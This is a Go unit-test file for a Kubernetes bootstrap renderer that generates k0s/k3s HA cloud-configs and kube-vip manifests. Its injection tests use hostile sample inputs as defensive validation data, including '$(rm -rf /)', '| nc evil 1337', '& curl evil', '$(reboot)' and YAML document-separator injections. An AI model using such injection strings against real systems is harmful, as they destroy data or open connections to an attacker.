/*
Copyright 2024 The Kairos CAPI Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
implied. See the License for the specific language governing
permissions and limitations under the License.
*/

package bootstrap

import (
	"io"
	"os"
	"os/exec"
	"strings"
	"testing"

	yaml "gopkg.in/yaml.v3"
)

// haCPData builds a control-plane TemplateData for the given role/distro/infra
// with a representative HA topology: a stable ControlPlaneEndpointHost (CAPV) or
// LB endpoint (CAPK), a VIP block (CAPV only), and a join token for join nodes.
func haCPData(role string, kubevirt bool) TemplateData {
	d := TemplateData{
		Role:             "control-plane",
		ControlPlaneRole: role,
		Hostname:         "kairos-cp-0",
		UserName:         "kairos",
		UserGroups:       []string{"admin"},
		IsKubeVirt:       kubevirt,
	}
	if role == "join" {
		d.JoinToken = "K10deadbeef::server:cafef00d"
	}
	if kubevirt {
		d.ControlPlaneLBEndpoint = "10.96.0.10"
		d.ManagementEndpoint = &ManagementEndpoint{
			APIServer:                 "https://mgmt.example.com:6443",
			Token:                     "mgmt-token",
			KubeconfigSecretName:      "cluster-kubeconfig",
			KubeconfigSecretNamespace: "default",
			ClusterName:               "ha-cluster",
		}
	} else {
		d.VIP = &VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"}
		d.ManagementEndpoint = &ManagementEndpoint{
			APIServer:                 "https://mgmt.example.com:6443",
			Token:                     "mgmt-token",
			KubeconfigSecretName:      "cluster-kubeconfig",
			KubeconfigSecretNamespace: "default",
			ClusterName:               "ha-cluster",
			ControlPlaneEndpointHost:  "192.168.1.240",
		}
	}
	return d
}

// TestHA_WorkerIgnoresControlPlaneRole is the render-time half of CPR-INV-1: a
// worker config carrying controlPlaneRole=init/join must NOT produce any
// control-plane HA artifact (no --cluster-init, no controller-token, no
// kube-vip). The helpers gate every HA branch on Role=="control-plane", so a
// poisoned worker config renders a plain worker. (The controller-side
// enforcement is Phase 3's CPR-INV-1; this proves the renderer does not betray
// it even if a poisoned config reaches render.)
func TestHA_WorkerIgnoresControlPlaneRole(t *testing.T) {
	for _, role := range []string{"init", "join"} {
		for _, dist := range []string{"k0s", "k3s"} {
			t.Run(role+"/"+dist, func(t *testing.T) {
				d := TemplateData{
					Role:             "worker",
					ControlPlaneRole: role, // hostile: a worker must never honor this
					UserName:         "kairos",
					WorkerToken:      "wt",
					K3sToken:         "k3t",
					K3sServerURL:     "https://server:6443",
					VIP:              &VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"},
				}
				out, err := renderForDist(dist, d)
				if err != nil {
					t.Fatalf("render: %v", err)
				}
				for _, forbidden := range []string{"--cluster-init", "controller-token", "server-token", "kube-vip.yaml"} {
					if strings.Contains(out, forbidden) {
						t.Errorf("worker with controlPlaneRole=%q must NOT render control-plane HA artifact %q", role, forbidden)
					}
				}
			})
		}
	}
}

// TestHA_InitVsSingle_K0s asserts the documented init-vs-single delta for k0s:
// init drops --single, keeps managed etcd, and emits api.sans for the endpoint.
func TestHA_InitVsSingle_K0s(t *testing.T) {
	single := haCPData("single", false)
	single.SingleNode = true
	single.VIP = nil // single never renders kube-vip
	single.ManagementEndpoint = nil
	sOut, err := RenderK0sCloudConfig(single)
	if err != nil {
		t.Fatalf("render single: %v", err)
	}
	if !strings.Contains(sOut, "- --single") {
		t.Error("k0s single must contain --single")
	}

	iOut, err := RenderK0sCloudConfig(haCPData("init", false))
	if err != nil {
		t.Fatalf("render init: %v", err)
	}
	if strings.Contains(iOut, "- --single") {
		t.Error("k0s init must NOT contain --single (managed etcd, not single-node)")
	}
	if !strings.Contains(iOut, "--config /etc/k0s/k0s.yaml") {
		t.Error("k0s init must pass --config so api.sans is honored")
	}
	if !strings.Contains(iOut, "sans:") || !strings.Contains(iOut, "- 192.168.1.240") {
		t.Error("k0s init must include the control-plane endpoint in api.sans")
	}
}

// TestHA_JoinTokenFile asserts join nodes write the token file and reference it,
// across both distributions, and that the token round-trips (no shell/YAML
// mangling of an opaque token).
func TestHA_JoinTokenFile(t *testing.T) {
	cases := []struct {
		name      string
		render    func(TemplateData) (string, error)
		tokenPath string
		serverArg string
	}{
		{"k0s_capv", RenderK0sCloudConfig, "/etc/k0s/controller-token", "--token-file=/etc/k0s/controller-token"},
		{"k3s_capv", RenderK3sCloudConfig, "/etc/rancher/k3s/server-token", "--token-file=/etc/rancher/k3s/server-token"},
		{"k0s_capk", RenderK0sCloudConfig, "/etc/k0s/controller-token", "--token-file=/etc/k0s/controller-token"},
		{"k3s_capk", RenderK3sCloudConfig, "/etc/rancher/k3s/server-token", "--token-file=/etc/rancher/k3s/server-token"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			kv := strings.HasSuffix(tc.name, "capk")
			d := haCPData("join", kv)
			out, err := tc.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if !strings.Contains(out, tc.serverArg) {
				t.Errorf("join render missing token-file arg %q", tc.serverArg)
			}
			// The token must round-trip through the rendered write_files content.
			content := extractWriteFile(t, out, tc.tokenPath)
			if content == "" {
				t.Fatalf("join render missing token file %q", tc.tokenPath)
			}
			if strings.TrimSpace(content) != d.JoinToken {
				t.Errorf("join token did not round-trip in %q: got %q want %q", tc.tokenPath, strings.TrimSpace(content), d.JoinToken)
			}
		})
	}
}

// TestHA_K3sInitWritesAndUsesServerToken is the BLOCKER-1 regression guard
// (ADR 0005 Phase 3): the k3s INIT node must BOTH write the shared server-token
// file AND pass --token-file, otherwise --cluster-init auto-generates a random
// K3S_TOKEN the joiners can never match and the cluster never forms. The k0s
// init node has no such requirement (managed-etcd init mints the controller-join
// token post-init), so this guard is k3s-only.
func TestHA_K3sInitWritesAndUsesServerToken(t *testing.T) {
	const tokenPath = "/etc/rancher/k3s/server-token"
	const tokenArg = "--token-file=/etc/rancher/k3s/server-token"

	for _, kv := range []bool{false, true} { // CAPV, CAPK
		name := "capv"
		if kv {
			name = "capk"
		}
		t.Run(name, func(t *testing.T) {
			d := haCPData("init", kv)
			d.JoinToken = "K10shared::server:tokenvalue" // init must carry the shared token too
			out, err := RenderK3sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if !strings.Contains(out, "--cluster-init") {
				t.Errorf("k3s init render missing --cluster-init")
			}
			if !strings.Contains(out, tokenArg) {
				t.Errorf("k3s init render missing %q — init would auto-generate a random token (BLOCKER-1)", tokenArg)
			}
			content := extractWriteFile(t, out, tokenPath)
			if content == "" {
				t.Fatalf("k3s init render missing server-token file %q (BLOCKER-1)", tokenPath)
			}
			if strings.TrimSpace(content) != d.JoinToken {
				t.Errorf("k3s init server-token did not round-trip: got %q want %q", strings.TrimSpace(content), d.JoinToken)
			}
		})
	}
}

// TestHA_JoinTokenAdversarialRoundTrip asserts that adversarial-but-legal join
// tokens (containing YAML-significant characters but no control chars) survive
// the write_files block-scalar embed byte-for-byte, and that tokens carrying
// newline/CR/NUL are REJECTED at render time (rejectControlChars is the
// load-bearing protection for JoinToken — it is a YAML block scalar, not a shell
// context, so shquote does not apply). (internal/bootstrap/CLAUDE.md HA section.)
func TestHA_JoinTokenAdversarialRoundTrip(t *testing.T) {
	roundTrip := []string{
		`K10::server:token`,
		`a"b#c`,
		`---leading-dashes`,
		`-startsWithDash`,
		`tok:with:colons`,
		`tok with spaces`,
		`$(reboot)` + "`id`" + `${HOME}`, // shell metas: inert in a YAML block scalar
	}
	rejected := []string{
		"tok\nwith-newline",
		"tok\rwith-cr",
		"tok\x00nul",
	}

	for _, render := range []func(TemplateData) (string, error){RenderK0sCloudConfig, RenderK3sCloudConfig} {
		tokenPath := "/etc/k0s/controller-token"
		for _, tok := range roundTrip {
			d := haCPData("join", false)
			d.JoinToken = tok
			out, err := render(d)
			if err != nil {
				t.Fatalf("render with token %q: %v", tok, err)
			}
			// Determine which token file this distro wrote.
			path := tokenPath
			if strings.Contains(out, "/etc/rancher/k3s/server-token") {
				path = "/etc/rancher/k3s/server-token"
			}
			content := extractWriteFile(t, out, path)
			if strings.TrimSpace(content) != tok {
				t.Errorf("token %q did not round-trip in %q: got %q", tok, path, strings.TrimSpace(content))
			}
		}
		for _, tok := range rejected {
			d := haCPData("join", false)
			d.JoinToken = tok
			if _, err := render(d); err == nil {
				t.Errorf("token %q with control char must be rejected at render", tok)
			}
		}
	}
}

// TestHA_JoinServerURLIsEndpointNotVIP is the explicit guard for the ADR
// invariant: the k3s join --server URL is the stable ControlPlaneEndpointHost,
// NOT the VIP block (even though, in a correctly-configured cluster, the two
// values coincide). We set them to DIFFERENT values to prove which one the
// template reads.
func TestHA_JoinServerURLIsEndpointNotVIP(t *testing.T) {
	d := haCPData("join", false)
	d.ManagementEndpoint.ControlPlaneEndpointHost = "cp.example.com" // the endpoint
	d.VIP.Address = "10.10.10.10"                                    // a DIFFERENT VIP address
	out, err := RenderK3sCloudConfig(d)
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(out, "--server=https://cp.example.com:6443") {
		t.Error("k3s join --server must use ControlPlaneEndpointHost (cp.example.com)")
	}
	if strings.Contains(out, "--server=https://10.10.10.10:6443") {
		t.Error("k3s join --server must NOT use the VIP address (10.10.10.10) — VIP only drives the kube-vip manifest")
	}
}

// TestHA_KubeVIP_OnlyCAPV asserts kube-vip renders for CAPV init/join and never
// for CAPK (OQ-5) or single-node.
func TestHA_KubeVIP_OnlyCAPV(t *testing.T) {
	type want struct {
		render   func(TemplateData) (string, error)
		role     string
		kubevirt bool
		expect   bool
	}
	cases := map[string]want{
		"k0s_capv_init": {RenderK0sCloudConfig, "init", false, true},
		"k3s_capv_join": {RenderK3sCloudConfig, "join", false, true},
		"k0s_capk_init": {RenderK0sCloudConfig, "init", true, false}, // OQ-5
		"k3s_capk_join": {RenderK3sCloudConfig, "join", true, false}, // OQ-5
		"k0s_capv_single": func() want {
			return want{RenderK0sCloudConfig, "single", false, false}
		}(),
	}
	for name, c := range cases {
		c := c
		t.Run(name, func(t *testing.T) {
			d := haCPData(c.role, c.kubevirt)
			if c.role == "single" {
				d.SingleNode = true
			}
			out, err := c.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			has := manifest != ""
			if has != c.expect {
				t.Errorf("kube-vip manifest present=%v, want %v", has, c.expect)
			}
			if c.expect {
				// VIP-INV-2 + ADR 0005 § D.1: the manifest must be a valid
				// multi-document set — ServiceAccount + ClusterRole +
				// ClusterRoleBinding + DaemonSet (not a single bare Pod).
				docs := decodeKubeVIPDocs(t, manifest)
				for _, wantKind := range []string{"ServiceAccount", "ClusterRole", "ClusterRoleBinding", "DaemonSet"} {
					if _, ok := docs[wantKind]; !ok {
						t.Errorf("kube-vip manifest missing %s document", wantKind)
					}
				}
				if _, ok := docs["Pod"]; ok {
					t.Errorf("kube-vip manifest still renders a bare Pod; expected a DaemonSet (ADR 0005 § D.1)")
				}
				// The ClusterRole must grant the load-bearing leader-election
				// lease verbs — the exact grant whose absence stalled the VIP in
				// the Phase-4 lab.
				var cr struct {
					Rules []struct {
						APIGroups []string `yaml:"apiGroups"`
						Resources []string `yaml:"resources"`
						Verbs     []string `yaml:"verbs"`
					} `yaml:"rules"`
				}
				remarshalInto(t, docs["ClusterRole"], &cr)
				leaseRule := false
				for _, r := range cr.Rules {
					if strSliceHas(r.APIGroups, "coordination.k8s.io") && strSliceHas(r.Resources, "leases") &&
						strSliceHas(r.Verbs, "get") && strSliceHas(r.Verbs, "create") {
						leaseRule = true
					}
				}
				if !leaseRule {
					t.Error("kube-vip ClusterRole missing the coordination.k8s.io/leases get+create rule (leader election)")
				}
				// The DaemonSet must run as the kube-vip SA, select control-plane
				// Nodes, and tolerate the control-plane NoSchedule taint.
				var ds struct {
					Spec struct {
						Template struct {
							Spec struct {
								ServiceAccountName string            `yaml:"serviceAccountName"`
								NodeSelector       map[string]string `yaml:"nodeSelector"`
								Tolerations        []struct {
									Key    string `yaml:"key"`
									Effect string `yaml:"effect"`
								} `yaml:"tolerations"`
							} `yaml:"spec"`
						} `yaml:"template"`
					} `yaml:"spec"`
				}
				remarshalInto(t, docs["DaemonSet"], &ds)
				ps := ds.Spec.Template.Spec
				if ps.ServiceAccountName != "kube-vip" {
					t.Errorf("DaemonSet serviceAccountName=%q, want kube-vip", ps.ServiceAccountName)
				}
				if ps.NodeSelector["node-role.kubernetes.io/control-plane"] != "true" {
					t.Errorf("DaemonSet nodeSelector missing node-role.kubernetes.io/control-plane=true; got %v", ps.NodeSelector)
				}
				cpTolerated := false
				for _, tol := range ps.Tolerations {
					if tol.Key == "node-role.kubernetes.io/control-plane" && tol.Effect == "NoSchedule" {
						cpTolerated = true
					}
				}
				if !cpTolerated {
					t.Error("DaemonSet missing toleration for node-role.kubernetes.io/control-plane:NoSchedule")
				}
			}
		})
	}
}

// TestHA_KubeVIP_Mode asserts ARP vs BGP toggles the env booleans.
func TestHA_KubeVIP_Mode(t *testing.T) {
	for _, tc := range []struct {
		mode string
		arp  string
		bgp  string
	}{
		{"ARP", "true", "false"},
		{"BGP", "false", "true"},
		{"", "true", "false"}, // empty defaults to ARP
	} {
		tc := tc
		t.Run("mode="+tc.mode, func(t *testing.T) {
			d := haCPData("init", false)
			d.VIP.Mode = tc.mode
			out, err := RenderK0sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			env := kubeVIPEnv(t, manifest)
			if env["vip_arp"] != tc.arp {
				t.Errorf("vip_arp=%q want %q for mode %q", env["vip_arp"], tc.arp, tc.mode)
			}
			if env["bgp_enable"] != tc.bgp {
				t.Errorf("bgp_enable=%q want %q for mode %q", env["bgp_enable"], tc.bgp, tc.mode)
			}
		})
	}
}

// kubeVIPEnv parses the kube-vip DaemonSet document out of the multi-document
// manifest (ADR 0005 § D.1) and returns its container env as a name->value map.
func kubeVIPEnv(t *testing.T, manifest string) map[string]string {
	t.Helper()
	dec := yaml.NewDecoder(strings.NewReader(manifest))
	for {
		var doc struct {
			Kind string `yaml:"kind"`
			Spec struct {
				Template struct {
					Spec struct {
						Containers []struct {
							Env []struct {
								Name  string `yaml:"name"`
								Value string `yaml:"value"`
							} `yaml:"env"`
						} `yaml:"containers"`
					} `yaml:"spec"`
				} `yaml:"template"`
			} `yaml:"spec"`
		}
		err := dec.Decode(&doc)
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("parse kube-vip manifest document: %v", err)
		}
		if doc.Kind != "DaemonSet" {
			continue
		}
		if len(doc.Spec.Template.Spec.Containers) == 0 {
			t.Fatalf("kube-vip DaemonSet has no containers")
		}
		m := map[string]string{}
		for _, e := range doc.Spec.Template.Spec.Containers[0].Env {
			m[e.Name] = e.Value
		}
		return m
	}
	t.Fatalf("kube-vip manifest has no DaemonSet document:\n%s", manifest)
	return nil
}

// decodeKubeVIPDocs decodes every YAML document in the multi-document kube-vip
// manifest into a generic map, keyed by kind (ADR 0005 § D.1). Every document
// must be valid YAML — this is the VIP-INV-2 "the whole set parses" guard.
func decodeKubeVIPDocs(t *testing.T, manifest string) map[string]map[string]any {
	t.Helper()
	byKind := map[string]map[string]any{}
	dec := yaml.NewDecoder(strings.NewReader(manifest))
	for {
		var m map[string]any
		err := dec.Decode(&m)
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("kube-vip manifest document is not valid YAML: %v\n%s", err, manifest)
		}
		if m == nil {
			continue
		}
		kind, _ := m["kind"].(string)
		byKind[kind] = m
	}
	return byKind
}

// remarshalInto re-serializes a generic decoded document and unmarshals it into
// the typed out, so a test can make typed assertions on one document of a
// multi-document manifest.
func remarshalInto(t *testing.T, m map[string]any, out any) {
	t.Helper()
	b, err := yaml.Marshal(m)
	if err != nil {
		t.Fatalf("re-marshal document: %v", err)
	}
	if err := yaml.Unmarshal(b, out); err != nil {
		t.Fatalf("unmarshal document into %T: %v", out, err)
	}
}

// strSliceHas reports whether s contains v.
func strSliceHas(s []string, v string) bool {
	for _, e := range s {
		if e == v {
			return true
		}
	}
	return false
}

// vipInjectionPayloads are shell/YAML-injection strings an operator could try
// to smuggle through VIP.Address / VIP.Interface. Every one must be REJECTED by
// validateVIP at render time (VIP-INV-3): none is a valid IP/hostname or
// interface name, so the render fails before any byte reaches the shell or the
// marshaled manifest.
var vipInjectionPayloads = map[string]string{
	"command substitution":  "$(rm -rf /)",
	"backtick substitution": "`reboot`",
	"semicolon":             "1.2.3.4; rm -rf /",
	"pipe":                  "1.2.3.4 | nc evil 1337",
	"ampersand background":  "1.2.3.4 & curl evil",
	"double quote":          `1.2.3.4"`,
	"single quote":          "1.2.3.4'",
	"newline":               "1.2.3.4\nrm -rf /",
	"yaml doc separator":    "1.2.3.4\n---\nevil: true",
	"yaml flow mapping":     "{evil: true}",
	"dollar brace":          "${IFS}cat",
	"all-zeros (semantic)":  "", // empty rejected explicitly below; placeholder
}

// TestVIP_Injection_Rejected asserts that an injection payload in either VIP
// field is rejected by the renderer (VIP-INV-3), for both distributions. This
// is the heart of the Phase-2 security mandate: the kube-vip block runs
// privileged on every CP node, so a malformed VIP must never reach render.
func TestVIP_Injection_Rejected(t *testing.T) {
	for name, payload := range vipInjectionPayloads {
		if payload == "" {
			continue // covered by TestVIP_EmptyAddressRejected
		}
		for _, field := range []string{"address", "interface"} {
			for _, dist := range []string{"k0s", "k3s"} {
				t.Run(name+"/"+field+"/"+dist, func(t *testing.T) {
					d := haCPData("init", false)
					switch field {
					case "address":
						d.VIP.Address = payload
					case "interface":
						d.VIP.Interface = payload
					}
					if _, err := renderForDist(dist, d); err == nil {
						t.Errorf("render with injection in VIP.%s=%q: expected error, got nil", field, payload)
					}
				})
			}
		}
	}
}

// TestVIP_EmptyAddressRejected pins the empty-address rejection.
func TestVIP_EmptyAddressRejected(t *testing.T) {
	d := haCPData("init", false)
	d.VIP.Address = ""
	if _, err := RenderK0sCloudConfig(d); err == nil {
		t.Error("empty VIP.Address must be rejected at render time")
	}
}

// TestVIP_ValidShapesAccepted asserts the canonical valid VIP shapes render.
func TestVIP_ValidShapesAccepted(t *testing.T) {
	cases := []struct {
		name string
		vip  VIPConfig
	}{
		{"ipv4 ARP", VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"}},
		{"ipv6 BGP", VIPConfig{Address: "2001:db8::1", Interface: "ens3", Mode: "BGP"}},
		{"hostname empty-mode", VIPConfig{Address: "cp.example.com", Interface: "bond0", Mode: ""}},
		{"bonded vlan iface", VIPConfig{Address: "10.0.0.5", Interface: "bond0.100", Mode: "ARP"}},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			d := haCPData("init", false)
			d.VIP = &tc.vip
			d.ManagementEndpoint.ControlPlaneEndpointHost = "cp.example.com"
			out, err := RenderK0sCloudConfig(d)
			if err != nil {
				t.Fatalf("render with valid VIP %+v: %v", tc.vip, err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			env := kubeVIPEnv(t, manifest)
			// VIP-INV-2 round-trip: the address/interface land in the manifest
			// env verbatim (yaml.v3 quoting envelope) — never mangled.
			if env["address"] != tc.vip.Address {
				t.Errorf("address did not round-trip: got %q want %q", env["address"], tc.vip.Address)
			}
			if env["vip_interface"] != tc.vip.Interface {
				t.Errorf("interface did not round-trip: got %q want %q", env["vip_interface"], tc.vip.Interface)
			}
		})
	}
}

// TestVIP_AdversarialInterface_BehindRegex documents that even if the
// interface-name regex were widened in future, the renderer marshals via
// yaml.v3 so a metachar can never break out of the env scalar. We cannot pass
// the regex with metachars today (they are rejected — see
// TestVIP_Injection_Rejected), so this asserts the marshaling envelope directly
// at the kubeVIPManifest level with a deliberately hostile value.
func TestVIP_ManifestMarshalEnvelopeHolds(t *testing.T) {
	hostile := []string{
		`evil: true`,
		`"; rm -rf /; echo "`,
		"$(reboot)",
		"---\nevil: true",
		"-leadingdash",
		"#hash",
		"with space",
	}
	for _, h := range hostile {
		h := h
		t.Run(h, func(t *testing.T) {
			// Call kubeVIPManifest directly (bypassing validateVIP) to prove the
			// YAML marshaling envelope (VIP-INV-2) holds regardless of the value.
			out, err := kubeVIPManifest(&VIPConfig{Address: h, Interface: h, Mode: "ARP"})
			if err != nil {
				t.Fatalf("kubeVIPManifest: %v", err)
			}
			// Every document in the multi-document set must be valid YAML — a
			// hostile value must not break out of its scalar and split/inject a
			// document. decodeKubeVIPDocs fails if any doc fails to parse.
			docs := decodeKubeVIPDocs(t, out)
			if _, ok := docs["DaemonSet"]; !ok {
				t.Fatalf("kube-vip manifest missing DaemonSet document with hostile value %q:\n%s", h, out)
			}
			env := kubeVIPEnv(t, out)
			if env["address"] != h {
				t.Errorf("hostile address did not round-trip inside YAML envelope: got %q want %q", env["address"], h)
			}
			if env["vip_interface"] != h {
				t.Errorf("hostile interface did not round-trip inside YAML envelope: got %q want %q", env["vip_interface"], h)
			}
		})
	}
}

// TestHA_RenderedScriptsValidBash runs `bash -n` on the post-bootstrap script of
// every HA render so a join/init-induced shell regression is caught at unit
// time (the script bodies only execute at node boot).
func TestHA_RenderedScriptsValidBash(t *testing.T) {
	bashPath, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available; skipping rendered-script syntax check")
	}
	cases := []struct {
		name   string
		render func(TemplateData) (string, error)
		role   string
		kv     bool
		script string
	}{
		{"k0s_capv_init", RenderK0sCloudConfig, "init", false, "kairos-k0s-post-bootstrap.sh"},
		{"k0s_capv_join", RenderK0sCloudConfig, "join", false, "kairos-k0s-post-bootstrap.sh"},
		{"k3s_capv_init", RenderK3sCloudConfig, "init", false, "kairos-k3s-post-bootstrap.sh"},
		{"k3s_capv_join", RenderK3sCloudConfig, "join", false, "kairos-k3s-post-bootstrap.sh"},
		{"k0s_capk_join", RenderK0sCloudConfig, "join", true, "kairos-k0s-post-bootstrap.sh"},
		{"k3s_capk_join", RenderK3sCloudConfig, "join", true, "kairos-k3s-post-bootstrap.sh"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			d := haCPData(tc.role, tc.kv)
			// CAPV HA nodes render the etcd-health reporter (ADR 0005 §E.1); set
			// the gate so its shell body is included in the bash -n syntax check.
			// CAPK (kubevirt) does not render it.
			if !tc.kv && d.ManagementEndpoint != nil {
				d.ManagementEndpoint.EtcdStatusSecretName = "ha-cluster-etcd-status"
			}
			out, err := tc.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			script := extractWriteFile(t, out, tc.script)
			if script == "" {
				t.Fatalf("post-bootstrap script %q not found", tc.script)
			}
			// The etcd-health reporter must render on the CAPV path (and only there).
			if hasReporter := strings.Contains(script, "push_etcd_status"); hasReporter != !tc.kv {
				t.Errorf("etcd-health reporter present=%v, want %v (CAPV renders it, CAPK does not)", hasReporter, !tc.kv)
			}
			f := filepathJoinTemp(t, strings.ReplaceAll(tc.name, "/", "_")+".sh")
			if err := os.WriteFile(f, []byte(script), 0o600); err != nil {
				t.Fatalf("write temp script: %v", err)
			}
			if outBytes, err := exec.Command(bashPath, "-n", f).CombinedOutput(); err != nil {
				t.Fatalf("bash -n on rendered %s failed: %v\n%s", tc.name, err, outBytes)
			}
		})
	}
}

// TestHA_EtcdLeaveResponder_k0sOnly asserts the ADR 0005 §E.3 etcd-leave
// responder renders on k0s CAPV HA nodes (valid bash; gates on the fixed
// leave-requested sentinel via string equality; runs `k0s etcd leave` with NO
// externally-supplied argument), and does NOT render for k0s single-node or for
// k3s (no clean member-remove, KD-5d).
func TestHA_EtcdLeaveResponder_k0sOnly(t *testing.T) {
	bashPath, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available; skipping rendered-script syntax check")
	}
	out, err := RenderK0sCloudConfig(haCPData("init", false))
	if err != nil {
		t.Fatalf("render k0s init: %v", err)
	}
	script := extractWriteFile(t, out, "kairos-etcd-leave.sh")
	if script == "" {
		t.Fatal("k0s HA control-plane must render the etcd-leave responder script")
	}
	if !strings.Contains(script, `[ "${val}" = "leave-requested" ]`) {
		t.Error("leave script must gate on the fixed sentinel via string equality (security constraint #4)")
	}
	if !strings.Contains(script, "k0s etcd leave") {
		t.Error("leave script must run `k0s etcd leave`")
	}
	if strings.Contains(script, "etcd leave --peer-address") {
		t.Error("leave script must NOT pass --peer-address (node leaves itself; no external arg — security constraint #5)")
	}
	f := filepathJoinTemp(t, "k0s-etcd-leave.sh")
	if werr := os.WriteFile(f, []byte(script), 0o600); werr != nil {
		t.Fatalf("write temp script: %v", werr)
	}
	if b, berr := exec.Command(bashPath, "-n", f).CombinedOutput(); berr != nil {
		t.Fatalf("etcd-leave script is not valid bash: %v\n%s", berr, b)
	}

	// k0s single-node must NOT render it (no etcd quorum).
	single := haCPData("single", false)
	single.SingleNode = true
	sout, err := RenderK0sCloudConfig(single)
	if err != nil {
		t.Fatalf("render k0s single: %v", err)
	}
	if extractWriteFile(t, sout, "kairos-etcd-leave.sh") != "" {
		t.Error("k0s single-node must NOT render the etcd-leave responder")
	}

	// k3s HA must NOT render it (KD-5d: no clean member-remove).
	kout, err := RenderK3sCloudConfig(haCPData("init", false))
	if err != nil {
		t.Fatalf("render k3s init: %v", err)
	}
	if extractWriteFile(t, kout, "kairos-etcd-leave.sh") != "" {
		t.Error("k3s must NOT render the etcd-leave responder (KD-5d)")
	}
}
